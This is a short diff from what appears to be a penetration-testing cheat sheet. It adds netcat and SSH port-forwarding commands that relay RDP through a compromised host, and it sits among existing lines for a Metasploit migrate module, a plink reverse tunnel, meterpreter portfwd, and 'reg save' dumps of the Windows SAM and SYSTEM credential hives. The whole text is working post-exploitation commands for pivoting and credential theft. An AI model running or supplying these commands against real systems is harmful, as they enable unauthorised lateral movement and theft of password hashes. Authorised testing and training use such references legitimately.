@@ -74,6 +74,12 @@ run post/windows/manage/migrate
 plink -l username -pw password -R 3389:192.168.1.2:3389 192.168.2.2 -P 22
 portfwd add -l 3389 -p 3389 -r 192.168.1.2
 
+nc -l -p 8888 -c "nc 192.168.1.2 3389"
+rdesktop 192.168.1.3:8888
+
+ssh -L 0.0.0.0:8888:192.168.1.2:3389 127.0.0.1
+rdesktop 192.168.1.3:8888
+
 reg save HKLM\SAM SAM
 reg save HKLM\SYSTEM SYSTEM
 
